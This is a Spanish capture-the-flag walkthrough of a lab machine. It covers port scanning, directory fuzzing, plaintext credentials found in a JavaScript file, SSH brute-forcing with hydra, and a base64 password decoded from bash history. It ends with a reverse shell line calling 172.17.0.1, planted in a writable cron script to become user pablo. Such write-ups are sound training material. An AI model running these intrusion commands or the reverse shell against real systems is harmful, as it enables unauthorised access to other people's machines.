## FASE DE ENUMERACIÓN
sabiendo que la IP de la máquina victima es : 172.17.0.2
```bash
sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 -oN PuertosYservicios 172.17.0.2
```
me reporta este resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:f6:3a:98:23:dc:8b:00:f0:5c:d5:50:07:f9:ec:e7 (ECDSA)
|_  256 b0:4e:cb:2a:e0:ac:cf:4c:14:7b:23:57:00:6d:12:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: CyberGuard - Seguridad Digital
```
puerto 22 y puerto 80 abiertos.

El puerto 22 es ssh version no vulnerable, sin credenciales ni users no podemos hacer gran cosa, asi pues no scentramos 
en el puerto 80

Hacemos fuzzing:
```bash
feroxbuster -u "http://172.17.0.2" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,js,old,bak -o fuzzFero
```
decubriendo algunas rutas:
```
1543822/1543822 6486647/s http://172.17.0.2/images/ => Directory listing
[####################] - 0s   1543822/1543822 385955500/s http://172.17.0.2/archiv/ => Directory listing
```
en esta ruta encontramos algo interesante:
```bash
http://172.17.0.2/archiv/script.js
```
```
const usuariosPermitidos = {
    'admin': 'CyberSecure123',
    'cliente': 'Password123',
    'chloe' : 'chloe123'
```
credenciales en texto plano.

## FASE INTRUSIÓN

Utilizamos las credenciales proporconadas en un ataque de fuerza bruta, hice un diccionario con los 3 uer y otrro con los 3 password,
hago fuerzabruta con hydra:
```bash
hydra -L users.txt  -P password.txt -t 16 -V -f -I ssh://172.17.0.2
```
```
[22][ssh] host: 172.17.0.2   login: chloe   password: chloe123
```
me conecto por ssh como chloe y uso la contraseña para loguearme:
```bash
ssh chloe@172.17.0.2
```

## FASE ESCALADA DE PRIVILEGIOS
miramos los usuarios que hay:
```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
veronica:x:1001:1001:,,,:/home/veronica:/bin/bash
pablo:x:1002:1002:,,,:/home/pablo:/bin/bash
chloe:x:1003:1003:,,,:/home/chloe:/bin/bash
````
Investigo si tengo algún privilegio y no encuentro nada, lo que si veo es que tengo acceso al home de vernica:
```bash
cd /home
````
miramos los propietarios y permisos de las carpetas:
```bash
ls -la
```
```
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 .
drwxr-xr-x 1 root     root     4096 May 11 07:13 ..
drwxr-x--- 1 chloe    chloe    4096 Apr 18 22:14 chloe
drwxr-x--- 1 pablo    pablo    4096 May  2 18:11 pablo
drwxr-x--- 2 ubuntu   ubuntu   4096 Jan 26 22:09 ubuntu
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 veronica
```
entramos en el home de veronica:
```bash
cd veronica/
```
miramos permisos:
```bash
ls -la
```
```
total 48
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 ..
-rw-r--r-- 1 veronica veronica   17 Apr 18 22:18 .bash_history
-rw-r--r-- 1 veronica veronica  220 Apr 16 23:00 .bash_logout
-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc
drwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local
-rw-r--r-- 1 veronica veronica  807 Apr 16 23:00 .profile
-rw------- 1 veronica veronica    7 Apr 18 16:35 .python_history
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images
```
investigando encontramos esto:
```bash
cat .bash_history
```
```
dmVyb25pY2ExMjMK
```
parecde un base64, lo decodeamos:
```bash
echo "dmVyb25pY2ExMjMK" | base64 -d
```
```
veronica123
```
provamos a cambiar al usuario veronica:
```bash
su veronica
```
pero al introducir el pass no nos deja
```
su: Authentication failure
```
provamos por SSH desde una terminal:
```bash
veronica@172.17.0.2
````
y ahora introduciendo el pass si nos deja.
 miramos los grupos a los que pertenece veronica:
 ```bash
id
```
```
uid=1001(veronica) gid=1001(veronica) groups=1001(veronica),100(users),1004(taller)
```
grupo "taller" lo tendremos en cuenta

miramos que tenemos por el home:
```bash
ls -la
```
```
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 .
drwxr-xr-x 1 root     root     4096 Apr 16 23:03 ..
-rw-r--r-- 1 veronica veronica   17 Apr 18 22:18 .bash_history
-rw-r--r-- 1 veronica veronica  220 Apr 16 23:00 .bash_logout
-rw-r--r-- 1 veronica veronica 3771 Apr 16 23:00 .bashrc
drwx------ 2 veronica veronica 4096 Apr 18 10:39 .cache
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .local
-rw-r--r-- 1 veronica veronica  807 Apr 16 23:00 .profile
-rw------- 1 veronica veronica    7 Apr 18 16:35 .python_history
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Desktop
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Documents
drwxrwxr-x 2 veronica veronica 4096 Apr 18 10:44 Images
```
y despues de mirar un poco vemos esto:
```bash
cd .local/
ls -la
```
```
drwxrwxr-x 3 veronica veronica 4096 Apr 18 11:13 .
drwxr-xrwx 1 veronica veronica 4096 Apr 18 16:35 ..
-rwxrwx--x 1 pablo    taller    121 Apr 17 17:23 script-h.sh
drwx------ 3 veronica veronica 4096 Apr 18 10:47 share
```

grupo taller, nos vamos a /tmp
```bash
cd /tmp
```

y pudiendo usar nc nos pasamos pspy64 para poder mirar procesos:

en la maquina victima:
```bash
nc -lvp 4444 > pspy64
```
en la maquina atacante donde tenemos el binario pspy64:
```bash
nc 172.17.0.2 4444 -w 3 < pspy64
```
una vez que lo tenemos damos permisos de ejecucion:
```bash
chmod +x pspy64
```
y lo ejecutamos:
```bash
./pspy64
```
vemos este proceso:
```
2025/05/11 07:33:01 CMD: UID=1002  PID=336    | /bin/sh -c /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1
```
el UID de usuario es 1002, que acordandonos del passwd "pablo:x:1002:1002:,,,:/home/pablo:/bin/bash" pertenece a pablo
ejecuta el script  /home/veronica/.local/script-h.sh que podemos modificar, así pues hacemos nano al script e introducimos unos comandos:
```bash
nano  /home/veronica/.local/script-h.sh
```
introducimos esta linea "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" quedando el script así:
```
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
hora_actual=$(date +"%H:%M:%S")


echo "La hora actual del sistema es: $hora_actual" >> /tmp/hora/hora.log
```
me pongo en escucha por el puerto 4444
```bash
sudo nc -lvnp 4444
```
y ya soy el usuario pablo.
